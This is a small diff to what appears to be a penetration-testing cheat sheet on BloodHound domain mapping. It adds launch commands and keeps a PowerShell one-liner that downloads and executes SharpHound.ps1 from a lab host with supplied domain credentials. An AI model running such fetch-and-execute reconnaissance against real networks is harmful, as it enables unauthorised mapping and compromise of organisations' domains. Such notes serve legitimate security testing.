@@ -206,6 +206,8 @@ Allows you to perform login attempts, pass the hash, execute commands, mimikatz,
 Graphically maps out an entire domain.
 
 ```
+neo4j console
+bloodhound
 powershell -nop -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10:8000/SharpHound.ps1'); Invoke-BloodHound -LDAPUser username -LDAPPass password"
 ```
 Download zip and drag into Bloodhound window.
